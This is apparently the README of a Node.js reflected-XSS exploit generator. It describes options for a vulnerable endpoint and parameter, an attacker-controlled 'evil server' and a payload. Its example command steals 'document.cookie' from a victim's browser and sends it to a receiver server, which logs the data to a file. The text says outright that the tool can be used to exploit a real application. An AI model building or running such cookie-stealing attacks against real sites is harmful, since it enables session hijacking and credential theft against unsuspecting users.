usage: node reflected-xss-exploit-generator.js [options]  
  
Options:
```
-i,--interactive    The program ask you the settings 1 by 1 with a large explanation and examples. Good if you never used it before or you are not an expert

-t,--target         The vulnerable endpoint.
-p,--parameter      The vulnerable parameter.
-u,--url            Your evil server url.
-r,--receiver       Your server parameter.
  ,--payload        Code that extracts data.
  ,--php            Only output server php code.
  ,--node           Only output server node code.
-l,--listen         Start the selected php or node http server on the port specified.
-h,--help           This message

NOTICE:
+ If you don't select --php or --node both codes are outputed to terminal so you can copy and paste.
+ If you select --listen, you have to select --php or --node.
+ If you select --listen, a link will be ready to send to the target and a server will be listening too to capture the output.
```

example:  
node reflected-xss-exploit-generator.js -t 'http://localhost:8080/login.php' -p 'username' -u 'http://localhost:1337/cookiesReceiver.js' -r 'username' --payload 'document.cookie' --node -l 1337  
  
  
To run this example you need to serve the vulnerable page:  
php -f vulnerableExample/login.php -S localhost:8080  

Then go to http://localhost:1337/news.html  
This is the url that is going to exploit the user by sending a formulary that steals cookies (or what ever you want) from his browsers to the vulnerable page. Once the target browser is in the vulnerable page, the payload extracts the cookies and redirects to the malicious server. The malicious server append the cookies to a xss-results.txt file and send a 301 redirect response to other page.


NOTICE: THIS PROGRAM IS UNDER DEVELOMENT, The --interactive is not asking if you want to listen (defaults to output code), some logs are not displaying, etc.  
The core is working, you can use it like in the example to exploit a real application.  
There is a lot of work yet to do.
